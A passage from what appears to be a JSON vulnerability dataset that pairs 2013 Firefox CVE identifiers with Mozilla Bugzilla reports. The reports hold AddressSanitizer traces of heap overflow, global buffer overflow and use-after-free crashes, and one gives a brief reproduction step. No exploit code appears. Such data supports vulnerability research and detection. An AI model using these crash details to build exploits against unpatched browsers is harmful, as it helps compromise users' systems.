button_press_event_cb(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:5256 #20 0x7f0fab655dd7 in ?? ??:0 0x7f0f8a78828b is located 1 bytes to the right of 10-byte region [0x7f0f8a788280,0x7f0f8a78828a) allocated by thread T0 here: #0 0x4c3640 in malloc ??:? #1 0x7f0fc9f7255a in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7f0faef6a566 in nsTArrayInfallibleAllocator::Malloc(unsigned long) ../../dist/include/nsTArray.h:60 #3 0x7f0faef6849e in nsTArray_base<nsTArrayDefaultAllocator>::EnsureCapacity(unsigned int, unsigned int) ../../dist/include/nsTArray-inl.h:119 #4 0x7f0fb1379494 in nsTArray<bool, nsTArrayDefaultAllocator>::AppendElements(unsigned int) ../../../dist/include/nsTArray.h:902 #5 0x7f0fb1377eb7 in ClusterIterator layout/generic/nsTextFrameThebes.cpp:6683 #6 0x7f0fb137ab1d in nsTextFrame::PeekOffsetWord(bool, bool, bool, int*, nsIFrame::PeekWordState*) layout/generic/nsTextFrameThebes.cpp:6731 #7 0x7f0fb0fa0b57 in nsIFrame::PeekOffset(nsPeekOffsetStruct*) layout/generic/nsFrame.cpp:6226 #8 0x7f0fb0f5b56e in nsFrame::PeekBackwardAndForward(nsSelectionAmount, nsSelectionAmount, int, nsPresContext*, bool, unsigned int) layout/generic/nsFrame.cpp:2954 #9 0x7f0fb0f5a4f5 in nsFrame::SelectByTypeAtPoint(nsPresContext*, nsPoint const&, nsSelectionAmount, nsSelectionAmount, unsigned int) layout/generic/nsFrame.cpp:2862 #10 0x7f0fb0f5d56b in nsFrame::HandleMultiplePress(nsPresContext*, nsGUIEvent*, nsEventStatus*, bool) layout/generic/nsFrame.cpp:2911 #11 0x7f0fb0f559d9 in nsFrame::HandlePress(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2710 #12 0x7f0fb0f4f9b7 in nsFrame::HandleEvent(nsPresContext*, nsGUIEvent*, nsEventStatus*) layout/generic/nsFrame.cpp:2401 #13 0x7f0fb0c2a70e in nsPresShellEventCB::HandleEvent(nsEventChainPostVisitor&) layout/base/nsPresShell.cpp:491 #14 0x7f0fb338abd3 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) content/events/src/nsEventDispatcher.cpp:362 #15 0x7f0fb338fe79 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) content/events/src/nsEventDispatcher.cpp:629 #16 0x7f0fb0be882c in PresShell::HandleEventInternal(nsEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6437 #17 0x7f0fb0be2ea3 in PresShell::HandlePositionedEvent(nsIFrame*, nsGUIEvent*, nsEventStatus*) layout/base/nsPresShell.cpp:6208 #18 0x7f0fb0bdaed6 in PresShell::HandleEvent(nsIFrame*, nsGUIEvent*, bool, nsEventStatus*) layout/base/nsPresShell.cpp:6007 #19 0x7f0fb454c39c in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) view/src/nsViewManager.cpp:767 #20 0x7f0fb4537f37 in nsView::HandleEvent(nsGUIEvent*, bool) view/src/nsView.cpp:1062 #21 0x7f0fb453818d in non-virtual thunk to nsView::HandleEvent(nsGUIEvent*, bool) :? #22 0x7f0fb9ca5e0a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) widget/gtk2/nsWindow.cpp:458 #23 0x7f0fb9cd9541 in nsWindow::OnButtonPressEvent(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:2729 #24 0x7f0fb9cf04d9 in button_press_event_cb(_GtkWidget*, _GdkEventButton*) widget/gtk2/nsWindow.cpp:5256 Shadow byte and word: 0x1fe1f14f1051: 2 0x1fe1f14f1050: 00 02 fb fb fb fb fb fb More shadow bytes: 0x1fe1f14f1030: fa fa fa fa fa fa fa fa 0x1fe1f14f1038: fa fa fa fa fa fa fa fa 0x1fe1f14f1040: fa fa fa fa fa fa fa fa 0x1fe1f14f1048: fa fa fa fa fa fa fa fa =>0x1fe1f14f1050: 00 02 fb fb fb fb fb fb 0x1fe1f14f1058: fb fb fb fb fb fb fb fb 0x1fe1f14f1060: fa fa fa fa fa fa fa fa 0x1fe1f14f1068: fa fa fa fa fa fa fa fa 0x1fe1f14f1070: fa fa fa fa fa fa fa fa Stats: 247M malloced (270M for red zones) by 396757 calls Stats: 42M realloced by 23311 calls Stats: 223M freed by 275477 calls Stats: 90M really freed by 187533 calls Stats: 480M (122969 full pages) mmaped in 120 calls mmaps by size class: 8:294894; 9:32764; 10:8190; 11:14329; 12:2048; 13:1536; 14:1280; 15:256; 16:1152; 17:1280; 18:144; 19:40; 20:20; mallocs by size class: 8:330117; 9:32695; 10:8737; 11:16289; 12:2501; 13:1727; 14:1555; 15:317; 16:1287; 17:1317; 18:154; 19:40; 20:21; frees by size class: 8:224898; 9:24420; 10:5483; 11:13159; 12:1629; 13:1507; 14:1392; 15:267; 16:1231; 17:1301; 18:134; 19:38; 20:18; rfrees by size class: 8:164815; 9:8613; 10:2103; 11:8730; 12:630; 13:557; 14:541; 15:144; 16:1042; 17:328; 18:25; 19:4; 20:1; Stats: malloc large: 1532 small slow: 2246 ==11059== ABORTING"
      }
    ],
    "CVE-2013-0779": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=801330",
        "title": "out-of-bounds-read in nsCodingStateMachine::NextState",
        "description": "Reproduces on trunk. Open the testcase and change character encoding View->Character Encoding->Auto-Detect->East Asian. ================================================================= ==32448== ERROR: AddressSanitizer global-buffer-overflow on address 0x7f2050d63e60 at pc 0x7f204271648c bp 0x7f20125fbfb0 sp 0x7f20125fbfa8 READ of size 4 at 0x7f2050d63e60 thread T27 #0 0x7f204271648b in nsCodingStateMachine::NextState(char) extensions/universalchardet/src/base/nsCodingStateMachine.h:37 #1 0x7f2042720237 in nsEscCharSetProber::HandleData(char const*, unsigned int) extensions/universalchardet/src/base/nsEscCharsetProber.cpp:56 #2 0x7f204273c9be in nsUniversalDetector::HandleData(char const*, unsigned int) extensions/universalchardet/src/base/nsUniversalDetector.cpp:169 #3 0x7f20427060b6 in nsXPCOMDetector::DoIt(char const*, unsigned int, bool*) extensions/universalchardet/src/xpcom/nsUdetXPCOMWrapper.cpp:57 #4 0x7f204270663c in non-virtual thunk to nsXPCOMDetector::DoIt(char const*, unsigned int, bool*) :? #5 0x7f203e90c6ed in nsHtml5StreamParser::FinalizeSniffing(unsigned char const*, unsigned int, unsigned int*, unsigned int) parser/html/nsHtml5StreamParser.cpp:584 #6 0x7f203e916118 in nsHtml5StreamParser::DoStopRequest() parser/html/nsHtml5StreamParser.cpp:1001 #7 0x7f203e9257a1 in nsHtml5RequestStopper::Run() parser/html/nsHtml5StreamParser.cpp:1027 #8 0x7f204530f4f0 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #9 0x7f2044fa036b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #10 0x7f204530732e in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:256 #11 0x7f20563eed16 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:156 #12 0x4c627a in __asan::AsanThread::ThreadStart() ??:? 0x7f2050d63e60 is located 0 bytes to the right of global variable 'ISO2022JPCharLenTable (extensions/universalchardet/src/base/nsEscSM.cpp)' (0x7f2050d63e40) of size 32 'ISO2022JPCharLenTable (extensions/universalchardet/src/base/nsEscSM.cpp)' is ascii string '' Shadow byte and word: 0x1fe40a1ac7cc: f9 0x1fe40a1ac7c8: 00 00 00 00 f9 f9 f9 f9 More shadow bytes: 0x1fe40a1ac7a8: 00 00 00 00 00 00 00 00 0x1fe40a1ac7b0: 00 00 00 00 f9 f9 f9 f9 0x1fe40a1ac7b8: 00 00 00 00 00 00 00 00 0x1fe40a1ac7c0: 04 f9 f9 f9 f9 f9 f9 f9 =>0x1fe40a1ac7c8: 00 00 00 00 f9 f9 f9 f9 0x1fe40a1ac7d0: 00 00 00 00 00 04 f9 f9 0x1fe40a1ac7d8: f9 f9 f9 f9 00 00 00 00 0x1fe40a1ac7e0: 00 00 00 00 00 00 00 00 0x1fe40a1ac7e8: 00 00 00 00 f9 f9 f9 f9 Thread T27 created by T0 here: #0 0x4bf8e4 in __interceptor_pthread_create ??:? #1 0x7f20563dff8f in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:393 #2 0x7f20563ddd3c in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:476 #3 0x7f204530a3ee in nsThread::Init() xpcom/threads/nsThread.cpp:322 #4 0x7f20453213ca in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:215 #5 0x7f2044f9d7fb in NS_NewThread_P(nsIThread**, nsIRunnable*, unsigned int) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:49 #6 0x7f203e8b22db in tag_nsresult NS_NewNamedThread_P<13ul>(char const (&) [13ul], nsIThread**, nsIRunnable*, unsigned int) ../../dist/include/nsThreadUtils.h:88 #7 0x7f203e8b1c49 in nsHtml5Module::GetStreamParserThread() parser/html/nsHtml5Module.cpp:118 #8 0x7f203e8ff98f in nsHtml5StreamParser parser/html/nsHtml5StreamParser.cpp:164 #9 0x7f203e6ddc66 in nsHtml5Parser::MarkAsNotScriptCreated(char const*) parser/html/nsHtml5Parser.cpp:575 #10 0x7f203cd70640 in nsHTMLDocument::StartDocumentLoad(char const*, nsIChannel*, nsILoadGroup*, nsISupports*, nsIStreamListener**, bool, nsIContentSink*) content/html/document/src/nsHTMLDocument.cpp:629 #11 0x7f203954f60e in nsContentDLF::CreateDocument(char const*, nsIChannel*, nsILoadGroup*, nsISupports*, nsID const&, nsIStreamListener**, nsIContentViewer**) layout/build/nsContentDLF.cpp:413 #12 0x7f203954c3c2 in nsContentDLF::CreateInstance(char const*, nsIChannel*, nsILoadGroup*, char const*, nsISupports*, nsISupports*, nsIStreamListener**, nsIContentViewer**) layout/build/nsContentDLF.cpp:207 #13 0x7f20414a2b17 in nsDocShell::NewContentViewerObj(char const*, nsIRequest*, nsILoadGroup*, nsIStreamListener**, nsIContentViewer**) docshell/base/nsDocShell.cpp:7927 #14 0x7f204149ad82 in nsDocShell::CreateContentViewer(char const*, nsIRequest*, nsIStreamListener**) docshell/base/nsDocShell.cpp:7732 #15 0x7f2041534339 in nsDSURIContentListener::DoContent(char const*, bool, nsIRequest*, nsIStreamListener**, bool*) docshell/base/nsDSURIContentListener.cpp:122 #16 0x7f2041562eff in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) uriloader/base/nsURILoader.cpp:654 #17 0x7f204155e824 in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) uriloader/base/nsURILoader.cpp:356 #18 0x7f204155d15c in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) uriloader/base/nsURILoader.cpp:248 #19 0x7f2037aff3a2 in nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) netwerk/base/src/nsBaseChannel.cpp:740 #20 0x7f2037b00ea6 in non-virtual thunk to nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) :? #21 0x7f2037b9a644 in nsInputStreamPump::OnStateStart() netwerk/base/src/nsInputStreamPump.cpp:417 #22 0x7f2037b99841 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/src/nsInputStreamPump.cpp:368 #23 0x7f2037b9cc5e in non-virtual thunk to nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) :? #24 0x7f2045201065 in nsInputStreamReadyEvent::Run() xpcom/io/nsStreamUtils.cpp:82 #25 0x7f204530f4f0 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #26 0x7f2044fa036b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #27 0x7f20439437b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #28 0x7f20455e9401 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:215 #29 0x7f20455e9236 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:208 #30 0x7f20455e911b in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:182 #31 0x7f2042de527a in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7f2041a13f84 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #33 0x7f20379c55ed in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3792 #34 0x7f20379cb465 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3858 #35 0x7f20379ce314 in XRE_main toolkit/xre/nsAppRunner.cpp:3933 #36 0x40baa3 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #37 0x4091e5 in main browser/app/nsBrowserApp.cpp:279 #38 0x7f205727076c in ?? ??:0 Stats: 96M malloced (135M for red zones) by 337281 calls Stats: 4M realloced by 18985 calls Stats: 73M freed by 210542 calls Stats: 0M really freed by 0 calls Stats: 268M (68645 full pages) mmaped in 67 calls mmaps by size class: 8:311277; 9:32764; 10:12285; 11:8188; 12:3072; 13:1536; 14:768; 15:256; 16:704; 17:96; 18:144; 19:8; 20:8; mallocs by size class: 8:288647; 9:26533; 10:10394; 11:6886; 12:2044; 13:1166; 14:533; 15:162; 16:694; 17:81; 18:129; 19:6; 20:6; frees by size class: 8:178460; 9:17981; 10:7052; 11:3628; 12:1110; 13:952; 14:391; 15:125; 16:655; 17:74; 18:106; 19:4; 20:4; rfrees by size class: Stats: malloc large: 222 small slow: 1511 ==32448== ABORTING"
      }
    ],
    "CVE-2013-0780": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=812893",
        "title": "Heap-use-after-free in nsOverflowContinuationTracker::Finish, with -moz-columns",
        "description": "Reproduces on trunk. ================================================================= ==3869== ERROR: AddressSanitizer: heap-use-after-free on address 0x7facf171c940 at pc 0x7fad10189afe bp 0x7fff43a32a90 sp 0x7fff43a32a88 READ of size 8 at 0x7facf171c940 thread T0 #0 0x7fad10189afd in nsFrameList::FirstChild() const src/layout/base/../generic/nsFrameList.h:214 #1 0x7fad10a06005 in nsOverflowContinuationTracker::Finish(nsIFrame*) src/layout/generic/nsContainerFrame.cpp:1719 #2 0x7fad109a7a57 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:306 #3 0x7fad10949e9d in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3097 #4 0x7fad1093ebe9 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2476 #5 0x7fad1092a670 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2284 #6 0x7fad10918fe3 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #7 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #8 0x7fad109e6ad3 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:649 #9 0x7fad109eeb11 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1032 #10 0x7fad109a7400 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:268 #11 0x7fad10949e9d in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3097 #12 0x7fad1093ebe9 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2476 #13 0x7fad10925cf7 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:1996 #14 0x7fad10918fe3 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #15 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #16 0x7fad109e6ad3 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:649 #17 0x7fad109eeb11 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1032 #18 0x7fad109a7400 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:268 #19 0x7fad10949e9d in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3097 #20 0x7fad1093ebe9 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2476 #21 0x7fad10925cf7 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:1996 #22 0x7fad10918fe3 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #23 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #24 0x7fad109e6ad3 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:649 #25 0x7fad109eeb11 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1032 #26 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #27 0x7fad10bd7066 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:473 #28 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #29 0x7fad10b4e948 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:433 #30 0x7fad10b534a6 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:533 #31 0x7fad10b57b40 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:774 #32 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #33 0x7fad10f4692a in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:202 #34 0x7fad106799bb in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7502 #35 0x7fad106a906d in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7643 #36 0x7fad106a7bbe in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3883 #37 0x7fad1074e155 in nsRefreshDriver::Notify(nsITimer*) src/layout/base/nsRefreshDriver.cpp:403 #38 0x7fad1cc44123 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:485 #39 0x7fad1cc454c1 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:565 #40 0x7fad1cc081be in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 #41 0x7fad1c87de0f in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:221 #42 0x7fad1afe3516 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #43 0x7fad1cef0cce in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:215 #44 0x7fad1cef0b15 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:208 #45 0x7fad1cef09fb in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 #46 0x7fad1a3e84d4 in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #47 0x7fad18f4de12 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #48 0x7fad0e437f24 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3823 #49 0x7fad0e43dbf9 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3890 #50 0x7fad0e440970 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4084 #51 0x40c0c6 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #52 0x409900 in main src/browser/app/nsBrowserApp.cpp:279 #53 0x7fad2e64e76c in ?? ??:0 0x7facf171c940 is located 0 bytes inside of 16-byte region [0x7facf171c940,0x7facf171c950) freed by thread T0 here: #0 0x4c3750 in __interceptor_free ??:? #1 0x7fad2c1dc405 in moz_free src/memory/mozalloc/mozalloc.cpp:48 #2 0x7fad10a0da58 in operator delete(void*) src/../../dist/include/mozilla/mozalloc.h:224 #3 0x7fad10a0cef3 in nsContainerFrame::StealFrame(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsContainerFrame.cpp:1212 #4 0x7fad10984dac in nsBlockFrame::StealFrame(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsBlockFrame.cpp:5538 #5 0x7fad10a0f51c in nsContainerFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsContainerFrame.cpp:1359 #6 0x7fad10986c30 in nsBlockFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsBlockFrame.cpp:5625 #7 0x7fad109a7ba2 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:307 #8 0x7fad10949e9d in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3097 #9 0x7fad1093ebe9 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2476 #10 0x7fad10925cf7 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:1996 #11 0x7fad10918fe3 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #12 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #13 0x7fad109e6ad3 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:649 #14 0x7fad109eeb11 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1032 previously allocated by thread T0 here: #0 0x4c3810 in malloc ??:? #1 0x7fad2c1dc541 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7fad10a0b40f in operator new(unsigned long) src/../../dist/include/mozilla/mozalloc.h:200 #3 0x7fad1094dbbe in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3266 #4 0x7fad1093ebe9 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2476 #5 0x7fad1092a670 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2284 #6 0x7fad10918fe3 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #7 0x7fad10a0566c in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #8 0x7fad109e6ad3 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:649 Shadow byte and word: 0x1ff59e2e3928: fd 0x1ff59e2e3928: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff59e2e3908: 00 00 00 00 00 fb fb fb 0x1ff59e2e3910: fa fa fa fa fa fa fa fa 0x1ff59e2e3918: fd fd fd fd fd fd fd fd 0x1ff59e2e3920: fa fa fa fa fa fa fa fa =>0x1ff59e2e3928: fd fd fd fd fd fd fd fd 0x1ff59e2e3930: fa fa fa fa fa fa fa fa 0x1ff59e2e3938: 00 00 00 00 00 00 00 00 0x1ff59e2e3940: fa fa fa fa fa fa fa fa 0x1ff59e2e3948: fd fd fd fd fd fd fd fd Stats: 252M malloced (231M for red zones) by 340183 calls Stats: 46M realloced by 17894 calls Stats: 221M freed by 224349 calls Stats: 186M really freed by 177540 calls Stats: 235M (60247 full pages) mmaped in 447 calls mmaps by size class: 7:102375; 8:45034; 9:13299; 10:5110; 11:8670; 12:1280; 13:960; 14:544; 15:224; 16:784; 17:460; 18:36; 19:35; 20:21; mallocs by size class: 7:196151; 8:83366; 9:22929; 10:9146; 11:19278; 12:2496; 13:1908; 14:1548; 15:413; 16:1467; 17:1349; 18:70; 19:40; 20:22; frees by size class: 7:122554; 8:54394; 9:16555; 10:5987; 11:17304; 12:1710; 13:1495; 14:1365; 15:281; 16:1256; 17:1334; 18:57; 19:38; 20:19; rfrees by size class: 7:99289; 8:43459; 9:10392; 10:4360; 11:13903; 12:1343; 13:996; 14:1255; 15:215; 16:939; 17:1297; 18:49; 19:37; 20:6; Stats: malloc large: 3361 small slow: 4876 ==3869== ABORTING"
      }
    ],
    "CVE-2013-0781": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=821991",
        "title": "[FIX] Heap-use-after-free in nsPrintEngine::CommonPrint",
